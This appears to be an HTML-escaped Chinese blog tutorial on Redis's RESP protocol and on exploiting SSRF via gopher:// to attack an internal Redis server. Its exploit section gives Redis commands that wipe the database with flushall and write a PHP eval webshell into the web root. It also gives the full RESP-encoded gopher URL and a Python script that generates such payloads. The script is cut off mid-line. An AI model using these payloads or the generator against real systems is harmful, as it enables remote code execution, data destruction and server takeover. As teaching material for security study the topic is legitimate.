-&lt;h5 id=&#34;首先了解一下resp协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#首先了解一下resp协议&#34;&gt;#&lt;/a&gt; 首先了解一下 resp 协议&lt;/h5&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;Redis&lt;/code&gt;  服务器与客户端通过 &lt;code&gt;RESP&lt;/code&gt; （REdis Serialization Protocol）协议通信&lt;/p&gt;
-&lt;p&gt;RESP 协议是在 Redis 1.2 中引入的，但它成为了与 Redis 2.0 中的 Redis 服务器通信的标准方式&lt;/p&gt;
-&lt;p&gt;RESP 实际上是一个支持以下数据类型的序列化协议：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;简单字符串&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;错误&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;整数&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;批量字符串&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;数组&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;RESP 在 Redis 中用作请求 - 响应协议的方式如下：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;客户端将&lt;em&gt;命令&lt;/em&gt;作为 &lt;code&gt;Bulk Strings&lt;/code&gt;  的 RESP 数组发送到 Redis 服务器&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;服务器根据命令实现回复一种 RESP 类型&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;在 RESP 中，某些数据的类型取决于第一个字节：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;对于客户端请求 &lt;code&gt;Simple Strings&lt;/code&gt; ，回复的第一个字节是 &lt;code&gt;+&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;对于客户端请求 &lt;code&gt;error&lt;/code&gt; ，回复的第一个字节是 &lt;code&gt;-&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;对于客户端请求 &lt;code&gt;Integer&lt;/code&gt; ，回复的第一个字节是 &lt;code&gt;:&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;对于客户端请求 &lt;code&gt;Bulk Strings&lt;/code&gt; ，回复的第一个字节是 &lt;code&gt;$&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;对于客户端请求 &lt;code&gt;array&lt;/code&gt; ，回复的第一个字节是 &lt;code&gt;*&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;此外， &lt;code&gt;RESP&lt;/code&gt;  能够使用稍后指定的 &lt;code&gt;Bulk Strings&lt;/code&gt;  或 &lt;code&gt;Array&lt;/code&gt;  的特殊变体来表示 &lt;code&gt;Null&lt;/code&gt;  值。&lt;/p&gt;
-&lt;p&gt;在 RESP 中，协议的不同部分始终以 &lt;code&gt;&amp;quot;\r\n&amp;quot;(CRLF)&lt;/code&gt;  结束。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;可以看到客户端将命令发送到 Redis 服务器的流程为&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;客户端向 Redis 服务器发送一个仅由 Bulk Strings 组成的 RESP Arrays&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Redis 服务器发送任何有效 RESP 数据类型作为回复返回给客户端&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Bulk Strings 用于表示长度最大为 512 MB 的单个二进制安全字符串，按以下方式编码：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;$字节数&lt;/code&gt; ：一个 &lt;code&gt;$&lt;/code&gt;  后跟组成字符串的字节数，由 CRLF 终止。&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;字符串数据&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;CRLF&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;字符串 &lt;code&gt;f4ke&lt;/code&gt;  的编码如下： &lt;code&gt;$4\r\nf4ke\r\n&lt;/code&gt; ，如下图格式&lt;/p&gt;
-&lt;p&gt;RESP Arrays 使用以下格式发送:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;*元素数&lt;/code&gt; ： &lt;code&gt;*&lt;/code&gt;  字符作为第一个字节，后跟数组中的元素数，后跟 CRLF&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;数组中的每个元素都附加 RESP 类型&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;每一个 &lt;code&gt;*number&lt;/code&gt;  代表每一行命令，number 代表每行命令中数组中的元素个数&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;图中的 &lt;code&gt;*3&lt;/code&gt; ，代表 &lt;code&gt;config get dbfilename&lt;/code&gt;  这行命令的 3 个元素&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;$number&lt;/code&gt;  代表每个元素的长度&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;$6&lt;/code&gt; ，代表 &lt;code&gt;config&lt;/code&gt;  长度&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;可以看到一个协议内容，严格根据协议的规定来写的，因此如果说我们想要利用 gopher 协议的话，我们就需要在 gopher 协议之后利用 resp 协议的内容。&lt;/p&gt;
-&lt;h6 id=&#34;有密码验证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#有密码验证&#34;&gt;#&lt;/a&gt; 有密码验证&lt;/h6&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;*2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;AUTH&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$6&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;123123&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;即使是有密码，也只是每一个命令都加一个验证的部分罢了&lt;/p&gt;
-&lt;h3 id=&#34;exp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp&lt;/h3&gt;
-&lt;p&gt;根据我们的协议内容，我们正常的去连接 redis 然后执行的一些命令，我们需要写成 resp 协议的方式&lt;br /&gt;
-例如：我们写 webshell 的命令&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flushall&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;?php eval($_POST\[\\&#34;f4ke\\&#34;\]);?&gt;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;config &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;dir&lt;/span&gt; /var/www/html&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;config &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; dbfilename 5he1l.php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;save&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;quit&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;我们需要转化成 resp 协议格式再加上 gopher 协议头 例如下图可以直接执行这个命令&lt;br /&gt;
-&lt;a href=&#34;http://xx.xx.xx.xx:8000/ssrf.php?url=gopher://127.0.0.1:6788/_*1&#34;&gt; http://xx.xx.xx.xx:8000/ssrf.php?url=gopher://127.0.0.1:6788/_*1&lt;/a&gt;&lt;br /&gt;
-$8&lt;br /&gt;
-flushall&lt;br /&gt;
-*3&lt;br /&gt;
-$3&lt;br /&gt;
-set&lt;br /&gt;
-$1&lt;br /&gt;
-1&lt;br /&gt;
-$33&lt;/p&gt;
-&lt;p&gt;&amp;lt;?php eval($_POST[&amp;quot;f4ke&amp;quot;]);?&amp;gt;&lt;/p&gt;
-&lt;p&gt;*4&lt;br /&gt;
-$6&lt;br /&gt;
-config&lt;br /&gt;
-$3&lt;br /&gt;
-set&lt;br /&gt;
-$3&lt;br /&gt;
-dir&lt;br /&gt;
-$13&lt;br /&gt;
-/var/www/html&lt;br /&gt;
-*4&lt;br /&gt;
-$6&lt;br /&gt;
-config&lt;br /&gt;
-$3&lt;br /&gt;
-set&lt;br /&gt;
-$10&lt;br /&gt;
-dbfilename&lt;br /&gt;
-$9&lt;br /&gt;
-5he1l.php&lt;br /&gt;
-*1&lt;br /&gt;
-$4&lt;br /&gt;
-save&lt;br /&gt;
-*1&lt;br /&gt;
-$4&lt;br /&gt;
-quit&lt;/p&gt;
-&lt;h4 id=&#34;工具使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具使用&#34;&gt;#&lt;/a&gt; 工具使用&lt;/h4&gt;
-&lt;ol&gt;
-&lt;li&gt;gopher 工具可以直接生成 payload&lt;/li&gt;
-&lt;li&gt;ssrf-redis 脚本 (将命令生成 resp 协议格式配合 gopher 协议)&lt;/li&gt;
-&lt;/ol&gt;
-&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# Time:2024/7/21  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# Author:K1t0  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; urllib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;parse  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 函数功能：将 redis 命令 编写成 resp 协议形式  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;redis_format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    CRLF&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;\r\n&#34;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 这是 redis 协议的规定  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    redis_arr&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;arr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    cmd&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    cmd&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;*&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;redis_arr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; redis_arr&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    cmd&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;CRLF&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;$&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;replace&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;$&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;CRLF&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;replace&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;$&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; cmd  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;__main__&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    protocol &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;gopher://&#34;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    ip &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;127.0.0.1&#34;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;6379&#34;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    shell &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;\n\n&amp;lt;?php eval($_POST[\&#34;k1t0\&#34;]);?&gt;\n\n&#34;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    filename &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;shell.php&#34;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    path &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;/var/www/html&#34;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    passwd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    cmd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;flushall&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;set 1 &amp;#123;&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;shell&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;replace&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;$&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;config set dir &amp;#123;&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;path&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;config set dbfilename &amp;#123;&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;filename&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;save&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;quit&#34;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; passwd&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    cmd&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;insert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;AUTH &amp;#123;&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;passwd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; protocol &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; ip &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;:&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; port &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;/_&#34;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; cmd&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    payload&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;urllib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;parse&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;quote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;redis_format&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;#print(payload)  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;urllib&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;parse&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;quote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token 